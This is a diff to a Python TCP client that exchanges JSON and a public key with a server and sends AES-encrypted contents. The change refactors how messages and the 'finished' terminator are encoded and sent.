@@ -16,8 +16,9 @@ MESSAGE = "Hello, World!"
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 s.connect((TCP_IP, TCP_PORT))
 
-def sendMsg(msg):
-    send_b = msg.encode('utf8')
+def sendMsg(msg, doEncode):
+    send_b = msg.encode('utf8') if doEncode else msg
+    send_b += b"finished"
     size = len(send_b)
     i = 0
     
@@ -28,7 +29,6 @@ def sendMsg(msg):
         i += 8192
 
     s.send(send_b[i:])
-    s.send("finished".encode('utf8'))
 
 def recv():
     msg = ""
@@ -47,7 +47,7 @@ response = {
     "platform": "win32"
 }
 
-sendMsg(json.dumps(response))
+sendMsg(json.dumps(response), True)
 
 # receive public key
 response = json.loads(recv())
@@ -64,7 +64,7 @@ response = {
     "enc_msg": enc_msg.decode('latin1')
 }
 
-sendMsg(json.dumps(response))
+sendMsg(json.dumps(response), True)
 
 # get return message
 response = recv()
@@ -87,7 +87,7 @@ try:
         "contents": contents.decode('latin1'),
     }
 
-    send_s = aes_.encrypt(json.dumps(send)).decode('latin1')
-    sendMsg(send_s)
+    send_s = aes_.encrypt(json.dumps(send))
+    sendMsg(send_s, False)
 except Exception as e:
     print(e)
